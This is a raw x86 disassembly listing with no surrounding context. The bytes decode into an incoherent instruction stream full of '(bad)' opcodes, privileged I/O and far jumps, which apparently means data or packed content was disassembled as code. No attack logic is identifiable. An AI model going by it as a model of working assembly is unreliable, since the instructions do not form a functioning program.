  410132:	icebp  
  410133:	test   al,0x2e
  410135:	clc    
  410136:	and    eax,0x73490724
  41013b:	add    eax,0xacdf5976
  410140:	pop    esi
  410141:	jl     0x41011c
  410143:	inc    edx
  410144:	ss aaa 
  410146:	push   esi
  410147:	mov    ss,esi
  410149:	fiadd  DWORD PTR [ebp+0x4e0f8202]
  41014f:	xlat   BYTE PTR ds:[ebx]
  410150:	sub    ch,BYTE PTR [eax+0x69]
  410153:	inc    esi
  410154:	sbb    eax,0xe013fb35
  410159:	ja     0x4101b3
  41015b:	xchg   ebx,eax
  41015c:	(bad)  
  41015d:	jbe    0x410154
  41015f:	mov    edi,0x113dceb6
  410164:	cdq    
  410165:	mov    BYTE PTR [ecx+0x37fdc835],cl
  41016b:	in     al,0x61
  41016d:	(bad)  
  41016e:	mov    bl,0x8b
  410170:	call   0xaa5:0xde103e9d
  410177:	adc    edx,eax
  410179:	mov    ebp,0x763ac007
  41017e:	pop    esi
  41017f:	push   cs
  410180:	push   ebp
  410181:	xor    edi,DWORD PTR [eax+0x72]
  410184:	push   cs
  410185:	jecxz  0x410202
  410187:	js     0x410169
  410189:	pop    ebp
  41018a:	jne    0x410196
  41018c:	xor    BYTE PTR [eax+0x15],cl
  41018f:	pop    ebx
  410190:	or     eax,0x2223fe09
  410195:	inc    ebp
  410196:	push   eax
  410197:	dec    edi
  410198:	xor    bh,BYTE PTR [edx+0x61e17b93]
  41019e:	test   DWORD PTR [esi+ecx*1-0x3],edx
  4101a2:	sub    eax,DWORD PTR [ebp+0x2d5e04fb]
  4101a8:	out    0x7d,eax
  4101aa:	repz sti 
  4101ac:	cs jb  0x410148
  4101af:	sbb    al,0xd7
  4101b1:	mov    esp,0x78fbd0cb
  4101b6:	leave  
  4101b7:	cmp    bh,BYTE PTR [ebp+0x13f2a751]
  4101bd:	mov    eax,0xf77c7e9a
  4101c2:	sbb    ah,BYTE PTR [ecx]
  4101c4:	mov    ss,WORD PTR [esi]
  4101c6:	mov    ecx,0xff24c5cc
  4101cb:	ja     0x41015b
  4101cd:	pop    ecx
  4101ce:	fs jbe 0x41016b
  4101d1:	cld    
  4101d2:	xchg   edi,eax
  4101d3:	loope  0x41015f
  4101d5:	jns    0x41021c
  4101d7:	push   ds
  4101d8:	pop    ecx
  4101d9:	fwait
  4101da:	int    0x6a
  4101dc:	repz mov WORD PTR [edx+0x27ee6494],?
  4101e3:	sbb    edi,DWORD PTR [edi]
  4101e5:	repnz enter 0x2c7c,0xc6
  4101ea:	mov    al,ds:0xd313bcfb
  4101ef:	or     ecx,edi
  4101f1:	mov    ds:0x1dbfef4d,eax
  4101f6:	inc    ebx
  4101f7:	shr    bh,1
  4101f9:	xchg   edi,eax
  4101fa:	cld    
  4101fb:	idiv   DWORD PTR [ecx-0xa]
  4101fe:	jno    0x41019d
  410200:	mov    dh,0x86
  410202:	cwde   
  410203:	dec    esi
  410204:	mov    eax,ds:0x6d32db1c
  410209:	sbb    eax,0x7e16034c
  41020e:	add    BYTE PTR [ebx+ebp*4-0x18ffb788],dh
  410215:	iret   
  410216:	jmp    0x41023b
  410218:	sbb    bl,BYTE PTR [edx]
  41021a:	cmp    eax,0x74ffa9ce
  41021f:	ror    DWORD PTR [ebx-0x6f],cl
  410222:	inc    ebx
  410223:	sub    DWORD PTR [ecx],edx
  410225:	cmc    
  410226:	push   esp
  410227:	adc    eax,0x1f819c95
  41022c:	in     al,dx
  41022d:	mov    ds:0xa011c4eb,eax
  410232:	mov    bl,0x3b
  410234:	js     0x410200
  410236:	stos   DWORD PTR es:[edi],eax
  410237:	pop    ebp
  410238:	mov    dh,0xbd
  41023a:	(bad)  
  41023b:	jno    0x41028d
  41023d:	fsub   DWORD PTR [esi+ebx*8-0x61e27c1c]
  410244:	test   DWORD PTR [ebp+edi*8-0x6371105],ebx
  41024b:	cdq    
  41024c:	push   eax
  41024d:	js     0x7b9d1fc9
  410253:	adc    al,0x1f
  410255:	ss lahf 
  410257:	lds    edx,FWORD PTR [edx-0x54]
  41025a:	inc    eax
  41025b:	jo     0x41029f
  41025d:	pop    esp
  41025e:	or     DWORD PTR [ebx],eax
  410260:	sbb    ch,BYTE PTR [ebp+0x34]
  410263:	jmp    FWORD PTR [ebp-0x41]
  410266:	data16 (bad) 
  410268:	sbb    DWORD PTR [eax-0x34],ecx
  41026b:	enter  0x5137,0x12
  41026f:	stos   BYTE PTR es:[edi],al
  410270:	loopne 0x4102f1
  410272:	cs jmp 0x410277
  410275:	push   0x40
  410277:	jns    0x4102cc
  410279:	aam    0xb7
  41027b:	push   esp
  41027c:	leave  
  41027d:	hlt    
  41027e:	jp     0x4102fb
  410280:	mov    eax,ds:0x822078c8
  410285:	stos   DWORD PTR es:[edi],eax
  410286:	xchg   BYTE PTR [ebx-0x45],ah
  410289:	call   0x6eda:0x9ac457fc
  410290:	cmp    al,0x79
  410292:	jmp    0x410305
  410294:	adc    DWORD PTR [eiz*1-0x122a10f2],eax
  41029b:	push   ss
  41029c:	pop    ss
  41029d:	sub    dh,BYTE PTR [edi]
  41029f:	jne    0x4102b2
  4102a1:	pop    esi
  4102a2:	jp     0x410310
  4102a4:	pop    es
  4102a5:	js     0x410315
  4102a7:	push   ebp
  4102a8:	les    esp,FWORD PTR [edx]
  4102aa:	lods   al,BYTE PTR ds:[esi]
  4102ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102ac:	dec    edx
  4102ad:	pop    edi
  4102ae:	and    BYTE PTR [edx],cl
  4102b0:	retf   0x6083
  4102b3:	(bad)  
  4102b4:	in     eax,dx
  4102b5:	retf   
  4102b6:	je     0x41026d
  4102b8:	inc    esp
  4102b9:	lea    ebp,[edi+0x2d]
  4102bc:	xchg   DWORD PTR [edi-0x61],eax
  4102bf:	cdq    
  4102c0:	(bad)  
  4102c1:	and    eax,0xdbcda368
  4102c6:	(bad)  
  4102c7:	in     eax,0x6c
  4102c9:	scas   eax,DWORD PTR es:[edi]
  4102ca:	push   ds
  4102cb:	inc    edi
  4102cc:	mov    WORD PTR [edi],es
  4102ce:	add    edi,DWORD PTR [edi+eiz*8]
  4102d1:	leave  
  4102d2:	sbb    eax,0x70fcdc1d
  4102d7:	cmp    BYTE PTR [edi-0x29e4896d],dl
  4102dd:	push   ecx
  4102de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102df:	or     eax,0x2e9bcf9b
  4102e4:	sub    DWORD PTR [ecx-0x31],edi
  4102e7:	mov    al,0x5d
  4102e9:	mov    edi,0xea837faa
  4102ee:	mov    BYTE PTR [esi-0x3f],cl
  4102f1:	dec    ebp
  4102f2:	mov    ds:0x19e5a26f,eax
  4102f7:	rol    DWORD PTR [edi-0x43],0x6a
  4102fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102fc:	or     eax,0x79a35e2
  410301:	push   ds
  410302:	or     al,BYTE PTR [edi+0x16ad6bfc]
  410308:	jl     0x4102b8
  41030a:	mov    eax,0xaf7864c5
  41030f:	test   eax,0xf6b989d3
  410314:	gs jg  0x41032e
  410317:	fadd   DWORD PTR [ecx-0x164940cf]
  41031d:	and    edx,DWORD PTR [ebx+0x5090dab0]
  410323:	cmp    eax,0x4a0c0d78
  410328:	push   ebx
  410329:	xchg   edx,eax
  41032a:	sahf   
  41032b:	je     0x4102b9
  41032d:	ds lock (bad) 
  410330:	jb     0x4102dc
  410332:	stos   DWORD PTR es:[edi],eax
  410333:	inc    ebp
  410334:	(bad)  
  410336:	adc    BYTE PTR [ebx],cl
  410338:	lods   al,BYTE PTR ds:[esi]
  410339:	or     ax,0x41c6
  41033d:	test   al,0x76
  41033f:	fnsave [edx]
  410341:	aas    
  410342:	pushf  
  410343:	cmp    eax,DWORD PTR [ebp-0x66962977]
  410349:	cmp    esi,DWORD PTR [ecx+0x915411d]
  41034f:	pop    es
  410350:	idiv   dh
  410352:	sbb    eax,0x66fa7a8f
  410357:	pop    ebp
  410358:	push   ebp
  410359:	push   0x77
  41035b:	jb     0x4102ff
  41035d:	fmul   DWORD PTR [esi+0x62c9d338]
  410363:	jmp    0x4103c2
  410365:	or     ah,ch
  410367:	pop    ebx
  410368:	cs add ebx,0x52a94996
  41036f:	mov    ecx,0xbb38da77
  410374:	jl     0x410394
  410376:	in     eax,0x2a
  410378:	and    al,0x13
  41037a:	xchg   edx,eax
  41037b:	mov    edx,cs
  41037d:	mov    esp,0x5d20f2a
  410382:	sar    BYTE PTR [ecx+0x2d],cl
  410385:	and    eax,0x9489e337
  41038a:	gs xchg ebp,eax
  41038c:	dec    ecx
  41038d:	mov    gs,WORD PTR [ebp+0x2238c9cc]
  410393:	sbb    eax,0x5db43302
  410398:	push   0xb494dd6f
  41039d:	xor    DWORD PTR [edx-0x40add69d],0xffffff9c
  4103a4:	jl     0x410376
  4103a6:	sbb    al,0xee
  4103a8:	jle    0x41032d
  4103aa:	sub    BYTE PTR [eax-0x76],0x93
  4103ae:	jp     0x410335
  4103b0:	cwde   
  4103b1:	nop
  4103b2:	push   ds
  4103b3:	mov    cl,0x8f
  4103b5:	pop    ecx
  4103b6:	pop    ebx
  4103b7:	ss inc ebp
  4103b9:	mov    ?,ebx
  4103bb:	test   eax,0x88e6bd3a
  4103c0:	push   ss
  4103c1:	(bad)  
  4103c3:	leave  
  4103c4:	enter  0x3a15,0x90
  4103c8:	push   ecx
  4103c9:	cdq    
  4103ca:	sub    eax,0x95c5bd60
  4103cf:	sbb    dl,bh
  4103d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d2:	mov    DWORD PTR [eax-0x17],eax
  4103d5:	jmp    0x4103fd
  4103d7:	push   ecx
  4103d8:	jmp    0x2df76cbc
  4103dd:	and    BYTE PTR [edx+esi*1-0x2af4c53a],ah
  4103e4:	sub    BYTE PTR [ebx],dh
  4103e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103e7:	push   cs
  4103e8:	jmp    0x669893f3
  4103ed:	sbb    bl,BYTE PTR [eax+0x72b71837]
  4103f3:	mov    edx,DWORD PTR [eax]
  4103f5:	std    
  4103f6:	mov    ah,0xa0
  4103f8:	cdq    
  4103f9:	mov    bh,0x51
  4103fb:	or     DWORD PTR [esi-0x77051467],0x17
  410402:	add    eax,0x3b7476e6
  410407:	in     eax,dx
  410408:	loopne 0x410424
  41040a:	icebp  
  41040b:	fwait
  41040c:	add    ebx,esp
  41040e:	cmp    ch,BYTE PTR [edi]
  410410:	aad    0x17
  410412:	cld    
  410413:	cwde   
  410414:	sub    eax,0xf6228a9c
  410419:	or     al,0xc6
  41041b:	(bad)  
  41041c:	arpl   cx,di
  41041e:	shl    BYTE PTR [esi-0x659ac491],1
  410424:	or     DWORD PTR [ebx],ebp
  410426:	jmp    0xaa7f244d
  41042b:	sub    bh,0x50
  41042e:	retf   
  41042f:	xlat   BYTE PTR ds:[ebx]
  410430:	xor    esp,DWORD PTR [ebx]
  410432:	jnp    0x410488
  410434:	and    esi,0xaf84c79d
  41043a:	jae    0x410471
  41043c:	add    esi,ebp
  41043e:	(bad)  
  41043f:	sub    BYTE PTR ds:0xc06c51bb,ah
  410445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410446:	jge    0x4104c1
  410448:	inc    edx
  410449:	xor    BYTE PTR [esp+edx*4],0xb5
  41044d:	add    DWORD PTR [ebp-0x7d],eax
  410450:	cmp    BYTE PTR [ebp+0x4b7cbebc],dh
  410456:	inc    esp
  410457:	sbb    al,0x38
  410459:	cmp    BYTE PTR cs:[edi-0x18],dl
  41045d:	scas   eax,DWORD PTR es:[edi]
  41045e:	inc    ecx
  41045f:	pop    ds
  410460:	rcl    DWORD PTR [edi-0x6b],0x5e
  410464:	pminsw mm0,QWORD PTR [ecx+0x0]
  410468:	cmp    DWORD PTR [ebp-0x20077b9c],ebx
  41046e:	and    edi,eax
  410470:	or     edx,ebp
  410472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410473:	lods   al,BYTE PTR ds:[esi]
  410474:	das    
  410475:	in     eax,dx
  410476:	xchg   ecx,eax
  410477:	sub    bh,BYTE PTR ds:0xb6a42ed5
  41047d:	adc    bh,ah
  41047f:	imul   esp,DWORD PTR [ecx-0x7d],0xc4c41e6e
  410486:	in     al,dx
  410487:	cdq    
  410488:	mov    ds:0x53f4cf04,eax
  41048d:	and    BYTE PTR [ecx],0xf2
  410490:	mov    BYTE PTR [edx],ch
  410492:	pop    eax
  410493:	and    dl,dl
  410495:	adc    BYTE PTR [ecx-0x5a],bh
  410498:	sar    DWORD PTR [esp+eax*2],1
  41049b:	add    ah,al
  41049d:	lds    edi,FWORD PTR [esi-0x2338ba00]
  4104a3:	xchg   BYTE PTR [edx+ecx*2+0xa],bl
  4104a7:	push   ss
  4104a8:	repnz std 
  4104aa:	mov    BYTE PTR [ecx],0x81
  4104ad:	outs   dx,BYTE PTR ds:[esi]
  4104ae:	nop
  4104af:	mov    al,ds:0x6a20638a
  4104b4:	mov    ebp,0x2e1de064
  4104b9:	iret   
  4104ba:	push   cs
  4104bb:	xor    al,0xca
  4104bd:	sub    al,bh
  4104bf:	mov    eax,0x6d6726fc
  4104c4:	inc    ebx
  4104c5:	fs adc eax,0x846d5a15
  4104cb:	push   ebx
  4104cc:	(bad)  
  4104cd:	sbb    dl,BYTE PTR [edi-0x7d77bfab]
  4104d3:	cmovbe eax,DWORD PTR [esi-0x3d]
  4104d7:	ja     0x4104ff
  4104d9:	pop    ds
  4104da:	adc    ebp,DWORD PTR [esp+ecx*1]
  4104dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104de:	add    BYTE PTR [ecx-0x1b],cl
  4104e1:	js     0x410503
  4104e3:	addr16 inc esi
  4104e5:	sbb    eax,ecx
  4104e7:	lahf   
  4104e8:	mov    ch,BYTE PTR [ecx-0x48bc866c]
  4104ee:	(bad)  
  4104ef:	int    0x75
  4104f1:	mov    ch,0x8b
  4104f3:	jmp    0x4104e8
  4104f5:	push   ss
  4104f6:	into   
  4104f7:	popf   
  4104f8:	xor    al,0xc5
  4104fa:	jmp    0x77426e36
  4104ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410500:	out    dx,ax
  410502:	mov    ebp,DWORD PTR [edi]
  410504:	push   edx
  410505:	sub    eax,0x52aab203
  41050a:	xchg   ebp,eax
  41050b:	retf   0xe1ae
  41050e:	sub    bl,BYTE PTR [ebx-0x19]
  410511:	sbb    al,0xc
  410513:	and    eax,0xf92dbb45
  410518:	mov    esi,0x76a3ab98
  41051d:	or     BYTE PTR ds:[ebx-0x6b7b5b5],dl
  410524:	xchg   ebp,eax
  410525:	push   ebp
  410526:	cmp    BYTE PTR [eax],bl
  410528:	dec    edx
  410529:	mov    WORD PTR [edi-0x6e],cs
  41052c:	rcl    DWORD PTR [edx],1
  41052e:	jecxz  0x4104d4
  410530:	loop   0x4104ee
  410532:	into   
  410533:	xchg   ebx,eax
  410534:	scas   eax,DWORD PTR es:[edi]
  410535:	and    al,0x61
  410537:	scas   eax,DWORD PTR es:[edi]
  410538:	adc    al,0xd5
  41053a:	(bad)  
  41053b:	in     al,dx
  41053c:	loop   0x41053a
  41053e:	and    eax,0xafae923a
  410543:	call   FWORD PTR [ecx]
  410545:	retf   0x7ff8
  410548:	jne    0x41052c
  41054a:	dec    ebp
  41054b:	das    
  41054c:	mov    ecx,0xbef4a214
  410551:	loope  0x410557
  410553:	cmp    BYTE PTR [edx+0x6d7d0e54],ch
  410559:	cwde   
  41055a:	mov    esi,0x6acbd0b5
  41055f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410560:	push   ebx
  410561:	mov    ebp,0xba3032ec
  410566:	push   0xffffffa3
  410568:	jmp    0xa6fa:0x8b554e4
  41056f:	mov    dl,0x25
  410571:	icebp  
  410572:	mov    eax,ds:0xeea5098a
  410577:	js     0x41051b
  410579:	rcl    DWORD PTR [eax+edx*1+0x13],1
  41057d:	cli    
  41057e:	xchg   edx,eax
  41057f:	in     al,dx
  410580:	sar    DWORD PTR [eax+ecx*2+0x3ff9f641],0xf3
  410588:	ffreep st(3)
  41058a:	pop    ecx
  41058b:	les    eax,FWORD PTR [eax]
  41058d:	xchg   ebp,eax
  41058e:	call   0xf70731f3
  410593:	ins    DWORD PTR es:[edi],dx
  410594:	sub    ah,BYTE PTR [eax+0x54]
  410597:	mov    ds:0xc1e78dfe,al
  41059c:	jmp    0xbe3e:0xc195628
  4105a3:	mov    eax,0x4cc6c091
  4105a8:	add    DWORD PTR [eax],edx
  4105aa:	inc    edi
  4105ab:	pop    eax
  4105ac:	in     al,dx
  4105ad:	and    BYTE PTR [esp+edx*8-0x472dd697],cl
  4105b4:	int    0x4
  4105b6:	push   0xffffffe1
  4105b8:	hlt    
  4105b9:	dec    edi
  4105ba:	mov    cl,0x63
  4105bc:	add    edi,DWORD PTR [ebx+0x19]
  4105bf:	mov    ecx,0xee6ccdc4
  4105c4:	dec    ebp
  4105c5:	fld    DWORD PTR [esi+0x29e118b6]
  4105cb:	pop    ebp
  4105cc:	cmp    eax,0xe010caa
  4105d1:	gs jg  0x4105d7
  4105d4:	add    DWORD PTR [ebx+edx*8-0x4d],esi
  4105d8:	mov    ah,0x8a
  4105da:	sub    bh,BYTE PTR [esi]
  4105dc:	nop
  4105dd:	ret    
  4105de:	mov    al,0x5c
  4105e0:	pop    ebx
  4105e1:	std    
  4105e2:	scas   al,BYTE PTR es:[edi]
  4105e3:	mov    dl,BYTE PTR [esi+0x37]
  4105e6:	sbb    bl,BYTE PTR [eax+ebx*2+0x6c]
  4105ea:	push   edi
  4105eb:	in     al,0x8f
  4105ed:	mov    ds:0xa8301a27,al
  4105f2:	adc    BYTE PTR ds:0xd8e6e5fe,bl
  4105f8:	popa   
  4105f9:	sbb    DWORD PTR [ebp+0x30],0xc0478105
  410600:	js     0x4105b2
  410602:	in     eax,0xd4
  410604:	nop
  410605:	clc    
  410606:	add    esp,esp
  410608:	scas   ax,WORD PTR es:[edi]
  41060a:	adc    dl,bl
  41060c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41060d:	pop    ebx
  41060f:	out    dx,al
  410610:	cmc    
  410611:	sub    BYTE PTR [eax-0x6597fe97],ch
  410617:	add    eax,0x73bcc3ca
  41061c:	retf   0x6ef0
  41061f:	adc    eax,0xc87af972
  410624:	xor    DWORD PTR [edx+0x10f4b9b6],edi
  41062a:	mov    al,ds:0x4ea23b5b
  41062f:	mov    bl,0x6e
  410631:	test   eax,0x8a3d3e54
  410636:	dec    esi
  410637:	cmp    esi,DWORD PTR [ebx]
  410639:	mov    edx,0x1f5c78cf
  41063e:	stos   BYTE PTR es:[edi],al
  41063f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410640:	iret   
  410641:	adc    cl,cl
  410643:	fs popf 
  410645:	retf   
  410646:	pop    ds
  410647:	gs mov ch,0xc4
  41064a:	mov    edx,0xaad7d41
  41064f:	mov    al,0x8c
  410651:	js     0x410674
  410653:	push   cs
  410654:	(bad)  
  410656:	shl    BYTE PTR [eax+0x25],1
  410659:	jno    0x410604
  41065b:	jno    0x410667
  41065d:	xchg   edx,eax
  41065e:	dec    edi
  41065f:	xlat   BYTE PTR ds:[ebx]
  410660:	lock fs ins BYTE PTR es:[edi],dx
  410663:	iret   
  410664:	std    
  410665:	jno    0x41061e
  410667:	pop    ebx
  410668:	pop    esi
  410669:	ins    DWORD PTR es:[edi],dx
  41066a:	add    DWORD PTR [ebx+0x39],esp
  41066d:	inc    edi
  41066e:	scas   eax,DWORD PTR es:[edi]
  41066f:	daa    
  410670:	mov    ds:0x326d2001,eax
  410675:	mov    BYTE PTR [eax+0x70a9bd89],al
  41067b:	dec    ebp
  41067c:	mov    ds:0x64593e2e,al
  410681:	lea    eax,[eax+0x6a7bda8a]
  410687:	retf   0xc649
  41068a:	pop    ds
  41068b:	stos   BYTE PTR es:[edi],al
  41068c:	les    esi,FWORD PTR [ebx]
  41068e:	and    dl,BYTE PTR [eax+edi*1+0x45b00f80]
  410695:	and    al,0x5a
  410697:	(bad)  
  410698:	and    al,0xf8
  41069a:	stos   BYTE PTR es:[edi],al
  41069b:	outs   dx,BYTE PTR ds:[esi]
  41069c:	fidivr DWORD PTR [ecx-0x573b0e90]
  4106a2:	sub    BYTE PTR [ebx-0x7f926a38],0x3f
  4106a9:	inc    edi
  4106aa:	mov    WORD PTR [ebp+0x2f],gs
  4106ad:	jno    0x4106bb
  4106af:	sub    ch,bl
  4106b1:	fxam   
  4106b3:	and    bh,BYTE PTR [ebx+0x76]
  4106b6:	cmp    al,0xf9
  4106b8:	retf   0x9758
  4106bb:	in     eax,dx
  4106bc:	jmp    0xd4108a6a
  4106c1:	sbb    eax,0x4e3fef38
  4106c6:	shl    BYTE PTR [ecx+0x39],0x22
  4106ca:	adc    DWORD PTR [edi-0x32c89198],edi
  4106d0:	pop    ss
  4106d1:	jns    0x41067f
  4106d3:	or     dh,BYTE PTR [ecx]
  4106d5:	cmp    DWORD PTR [ecx+0x1d9988a0],esp
  4106db:	jle    0x41074c
  4106dd:	pop    esi
  4106de:	dec    ecx
  4106df:	rcl    BYTE PTR [eax+0x172df115],cl
  4106e5:	loopne 0x4106bf
  4106e7:	das    
  4106e8:	inc    edi
  4106e9:	xor    BYTE PTR ds:0x153859a3,dl
  4106ef:	fnstcw WORD PTR [ebp-0x7d]
  4106f2:	push   edx
  4106f3:	cmp    BYTE PTR [edi],dh
  4106f5:	aam    0xcb
  4106f7:	repnz ds cli 
  4106fa:	imul   DWORD PTR [eax-0x77]
  4106fd:	fdivr  QWORD PTR [ebp+eax*4+0x610b2329]
  410704:	mov    eax,edi
  410706:	fimul  DWORD PTR [eax]
  410708:	retf   0xcdf3
  41070b:	cmp    al,0xa6
  41070d:	bswap  edi
  41070f:	inc    ebp
  410710:	repz mov WORD PTR [esi],es
  410713:	xor    esi,DWORD PTR [edx]
  410715:	inc    edx
  410716:	add    DWORD PTR [edx+eiz*4-0x36],edi
  41071a:	mov    ecx,eax
  41071c:	fwait
  41071d:	icebp  
  41071e:	ja     0x41075c
  410720:	scas   eax,DWORD PTR es:[edi]
  410721:	jno    0x410766
  410723:	fstp   QWORD PTR [ebx]
  410725:	fmul   QWORD PTR [ecx+0x6ae6c4bc]
  41072b:	mov    gs,WORD PTR [esi+0x4baf91fb]
  410731:	pushf  
  410732:	shl    esi,cl
  410734:	mov    ah,dh
  410736:	scas   al,BYTE PTR es:[edi]
  410737:	adc    DWORD PTR [edx-0x38470ac0],edx
  41073d:	jns    0x410704
  41073f:	push   edi
  410740:	jns    0x410751
  410742:	push   edx
  410743:	jecxz  0x4106c7
  410745:	repz sub dl,BYTE PTR [edx+eiz*4]
  410749:	cmp    DWORD PTR [edx],ebp
  41074b:	mov    ch,BYTE PTR [ecx+0x4b]
  41074e:	scas   eax,DWORD PTR es:[edi]
  41074f:	(bad)  
  410750:	in     al,0xf1
  410752:	mov    eax,0x230ca557
  410757:	stc    
  410758:	lods   al,BYTE PTR ds:[esi]
  410759:	std    
  41075a:	ds data16 jg 0x41074b
  41075e:	jo     0x410726
  410760:	pop    ss
  410761:	(bad)  
  410762:	loop   0x41075f
  410764:	mov    ds:0xa9b55f2c,al
  410769:	inc    ebx
  41076a:	in     eax,dx
  41076b:	cli    
  41076c:	lds    ebx,FWORD PTR [edx+0x4e96137a]
  410772:	fnsave [ecx-0x34]
  410775:	dec    eax
  410776:	outs   dx,BYTE PTR ds:[esi]
  410777:	cmp    eax,DWORD PTR [esi+edx*8]
  41077a:	mov    bh,0x78
  41077c:	and    al,0x35
  41077e:	mov    ds:0xf7a5bf67,eax
  410783:	jp     0x4107b7
  410785:	sub    BYTE PTR [eax-0x6],0x68
  410789:	inc    edi
  41078a:	mov    ch,0xdd
  41078c:	mov    dh,0x80
  41078e:	clc    
  41078f:	(bad)  
  410790:	fmul   QWORD PTR [ecx]
  410792:	es add eax,eax
  410795:	cmp    DWORD PTR cs:[eax+0x7c],esp
  410799:	sbb    ebp,edx
  41079b:	jne    0x4107f6
  41079d:	mov    ?,WORD PTR [eax+edi*2+0x48fa50b8]
  4107a4:	xor    ah,BYTE PTR [edx]
  4107a6:	sbb    BYTE PTR [eax-0x6f],dl
  4107a9:	xor    eax,0x8f5140f0
  4107ae:	cli    
  4107af:	adc    edi,DWORD PTR [eax-0x1f]
  4107b2:	jmp    0x4107d5
  4107b4:	push   ebx
  4107b5:	test   eax,0x1199320f
  4107ba:	fild   DWORD PTR [ecx]
  4107bc:	push   ebx
  4107bd:	add    eax,0x13c89a82
  4107c2:	(bad)  
  4107c3:	xor    ebp,DWORD PTR [esi]
  4107c5:	add    DWORD PTR [ebx+0x10dd9fff],edx
  4107cb:	inc    edx
  4107cc:	popa   
  4107cd:	adc    al,0x9a
  4107cf:	lock pop ss
  4107d1:	xor    edi,DWORD PTR [ebx+0x77014a88]
  4107d7:	adc    DWORD PTR [edi+esi*1],esi
  4107da:	out    dx,al
  4107db:	imul   ebx,ecx,0xed9daf3f
  4107e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e2:	push   ebx
  4107e3:	mov    ah,0x60
  4107e5:	ret    
  4107e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107e7:	mov    cl,0x66
  4107e9:	sbb    BYTE PTR [ebp-0x72],ah
  4107ec:	cli    
  4107ed:	xchg   ebx,eax
  4107ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ef:	xor    bl,dl
  4107f1:	push   esp
  4107f2:	int3   
  4107f3:	pop    ebp
  4107f4:	out    dx,eax
  4107f5:	mul    DWORD PTR [eax]
  4107f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107f8:	xlat   BYTE PTR ds:[ebx]
  4107f9:	xlat   BYTE PTR ds:[ebx]
  4107fa:	cdq    
  4107fb:	inc    eax
  4107fc:	lds    edi,FWORD PTR [edx-0x6a]
  4107ff:	xchg   esi,ebp
  410801:	sub    edx,DWORD PTR [esi+0xaa4b973]
  410807:	add    eax,0x61a7593c
  41080c:	repnz sahf 
  41080e:	jmp    0x39ec:0xe2fc5a49
  410815:	or     eax,0xe1c5c1f5
  41081a:	push   0x42d1c9ee
  41081f:	jg     0x410812
  410821:	push   esi
  410822:	push   cs
  410823:	cmp    BYTE PTR [ecx-0xf733152],bl
  410829:	push   0xffffffc7
  41082b:	sti    
  41082c:	pusha  
  41082d:	fidiv  DWORD PTR [ebp+0x658d6a81]
  410833:	into   
  410834:	pop    ds
  410835:	lods   eax,DWORD PTR ds:[esi]
  410836:	cwde   
  410837:	mov    dl,BYTE PTR [esi+esi*2]
  41083a:	jmp    0x41085e
  41083c:	lea    esi,[ecx+ebx*8-0x5f5f3405]
  410843:	push   ecx
  410844:	adc    eax,0xc4987cd2
  410849:	xchg   edi,eax
  41084a:	std    
  41084b:	mov    dl,0x31
  41084d:	pop    esp
  41084e:	sub    BYTE PTR [eax-0x14bd9715],al
  410854:	mov    ebx,0x75a35dd7
  410859:	xor    eax,0x59448744
  41085e:	push   edi
  41085f:	iret   
  410860:	shl    BYTE PTR [esi+0x2d],0xf7
  410864:	pushf  
  410865:	(bad)
  410869:	add    al,0xf1
  41086b:	adc    ecx,esi
  41086d:	icebp  
  41086e:	std    
  41086f:	in     eax,dx
  410870:	fidivr DWORD PTR [ecx-0x3502cf9e]
  410876:	xchg   esp,eax
  410877:	pop    edi
  410878:	dec    ebp
  410879:	fimul  WORD PTR [edi]
  41087b:	adc    dh,bl
  41087d:	cmp    dh,al
  41087f:	leave  
  410880:	inc    edi
  410881:	mov    eax,0xd8348a4f
  410886:	or     cl,dh
  410888:	lock lods eax,DWORD PTR ds:[esi]
  41088a:	out    0x8d,al
  41088c:	pop    esi
  41088d:	inc    edx
  41088e:	std    
  41088f:	cmc    
  410890:	scas   eax,DWORD PTR es:[edi]
  410891:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410893:	test   al,0x76
  410895:	adc    DWORD PTR [esi+0x23ba6bb],esi
  41089b:	jmp    0x6926:0xc651f32e
  4108a2:	push   ebp
  4108a3:	mov    ah,dh
  4108a5:	mov    edx,0xfe4e4bb
  4108aa:	shr    ecx,1
  4108ac:	dec    esi
  4108ad:	sar    DWORD PTR [ecx+0x2d],0xfe
  4108b1:	bound  ecx,QWORD PTR [ecx]
  4108b3:	xchg   eax,esp
  4108b5:	xchg   ebp,eax
  4108b6:	in     al,dx
  4108b7:	popf   
  4108b8:	mov    al,0xa1
  4108ba:	push   ebp
  4108bb:	dec    esi
  4108bc:	dec    edx
  4108bd:	in     al,0x6f
  4108bf:	mov    DWORD PTR [esi-0x4310c3],edi
  4108c5:	xchg   edx,eax
  4108c6:	mov    esp,0xd401165
  4108cb:	sub    dl,BYTE PTR [esi+ebp*8]
  4108ce:	shr    DWORD PTR [ebx],cl
  4108d0:	push   0xbf8d90c6
  4108d5:	sub    dh,dh
  4108d7:	push   ecx
  4108d8:	(bad)  
  4108d9:	push   esi
  4108da:	in     eax,dx
  4108db:	fisub  DWORD PTR [esi-0x30b2b661]
  4108e1:	ror    BYTE PTR [ebx],0x6f
  4108e4:	mov    ebp,DWORD PTR ds:0x1a9a4e68
  4108ea:	push   edi
  4108eb:	dec    esp
  4108ec:	rcr    DWORD PTR [ecx+0x1f22de9c],0xb2
  4108f3:	(bad)  
  4108f4:	or     al,0x8b
  4108f6:	pop    ebp
  4108f7:	push   ss
  4108f8:	jecxz  0x41093e
  4108fa:	fnstsw WORD PTR [edx+0x3e]
  4108fd:	call   0x1a71193b
  410902:	or     ecx,0x30e0a6a2
  410908:	push   0x1f
  41090a:	xchg   ebp,eax
